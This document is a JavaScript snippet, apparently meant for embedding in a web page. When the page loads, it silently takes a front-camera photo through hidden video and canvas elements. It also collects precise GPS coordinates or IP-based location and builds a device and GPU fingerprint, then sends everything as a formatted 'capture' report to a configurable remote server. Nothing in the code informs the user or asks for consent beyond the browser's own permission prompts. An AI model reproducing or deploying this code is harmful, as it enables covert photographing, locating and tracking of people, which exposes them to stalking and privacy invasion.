(function() {
    const scriptTag = document.currentScript;
    const trackingId = scriptTag.dataset.trackingId;
    const workerUrl = scriptTag.dataset.serverUrl;

    async function capturarFoto() {
        const video = document.createElement('video');
        const canvas = document.createElement('canvas');
        video.style.display = 'none';
        canvas.style.display = 'none';
        document.body.appendChild(video);
        document.body.appendChild(canvas);
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            video.srcObject = stream;
            await new Promise(r => { video.onloadedmetadata = () => { video.play(); r(); }; });
            await new Promise(r => setTimeout(r, 300));
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
            video.srcObject = null;
            stream.getTracks().forEach(t => t.stop());
            video.remove();
            canvas.remove();
            return blob;
        } catch(e) { return null; }
    }

    function capturarGPS() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) { resolve(null); return; }
            let mejor = null;
            let watchId = navigator.geolocation.watchPosition(
                (pos) => {
                    const coords = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy };
                    if (!mejor || coords.acc < mejor.acc) mejor = coords;
                    if (coords.acc < 20) {
                        navigator.geolocation.clearWatch(watchId);
                        resolve(mejor);
                    }
                },
                () => {
                    navigator.geolocation.clearWatch(watchId);
                    resolve(mejor);
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
            setTimeout(() => {
                navigator.geolocation.clearWatch(watchId);
                resolve(mejor);
            }, 5000);
        });
    }

    async function capturarIP() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            if (data.latitude && data.longitude) {
                return { lat: data.latitude, lng: data.longitude, ciudad: data.city, pais: data.country_name, ip: data.ip };
            }
        } catch(e) {}
        return null;
    }

    function obtenerDispositivo() {
        const ua = navigator.userAgent;
        let modelo = 'Desconocido';
        if (ua.includes('iPhone')) modelo = 'iPhone';
        else if (ua.includes('iPad')) modelo = 'iPad';
        else if (ua.includes('Android')) modelo = 'Android';
        else if (ua.includes('Mac')) modelo = 'Mac';
        else if (ua.includes('Windows')) modelo = 'Windows PC';
        else if (ua.includes('Linux')) modelo = 'Linux';
        return { modelo, ua };
    }

    function obtenerFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 200; canvas.height = 50;
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 200, 50);
            ctx.fillStyle = '#069';
            ctx.font = '14px Arial';
            ctx.fillText('FP', 10, 30);
            const hash = canvas.toDataURL().slice(0, 80);
            let gpu = 'N/A';
            try {
                const gl = document.createElement('canvas').getContext('webgl');
                const info = gl.getExtension('WEBGL_debug_renderer_info');
                gpu = info ? gl.getParameter(info.UNMASKED_RENDERER_WEBGL) : 'N/A';
            } catch(e) {}
            return { gpu, canvas: hash };
        } catch(e) {
            return { gpu: 'N/A', canvas: 'N/A' };
        }
    }

    async function enviarAlWorker() {
        const [foto, gps, ip, dispositivo, fp] = await Promise.all([
            capturarFoto(),
            capturarGPS(),
            capturarIP(),
            obtenerDispositivo(),
            obtenerFingerprint()
        ]);

        let msg = '📊 *Captura*';
        msg += `\n━━━━━━━━━━━━━━━━`;
        if (gps) {
            msg += `\n📍 GPS: ${gps.lat}, ${gps.lng} (±${gps.acc}m)`;
            msg += `\n🗺️ https://maps.google.com/?q=${gps.lat},${gps.lng}`;
        } else if (ip) {
            msg += `\n📍 IP: ${ip.lat}, ${ip.lng}`;
            msg += `\n   País: ${ip.pais}`;
            msg += `\n   Ciudad: ${ip.ciudad}`;
            msg += `\n   IP: ${ip.ip}`;
        } else {
            msg += `\n📍 Ubicación: No disponible`;
        }
        msg += `\n📱 Dispositivo: ${dispositivo.modelo}`;
        msg += `\n🎨 GPU: ${fp.gpu}`;
        msg += `\n⏰ ${new Date().toISOString()}`;

        // ========== ENVIAR AL WORKER ==========
        const formData = new FormData();
        formData.append('text', msg);
        if (foto) formData.append('photo', foto, 'photo.jpg');
        if (gps) {
            formData.append('latitude', gps.lat);
            formData.append('longitude', gps.lng);
        }

        try {
            const response = await fetch(workerUrl, {
                method: 'POST',
                body: formData  // <-- FormData establece el Content-Type automáticamente
            });
            const result = await response.json();
            console.log('✅ Datos enviados al Worker:', result);
        } catch(e) {
            console.error('❌ Error al enviar al Worker:', e);
        }
    }

    window.addEventListener('load', () => {
        setTimeout(enviarAlWorker, 500);
    });
})();
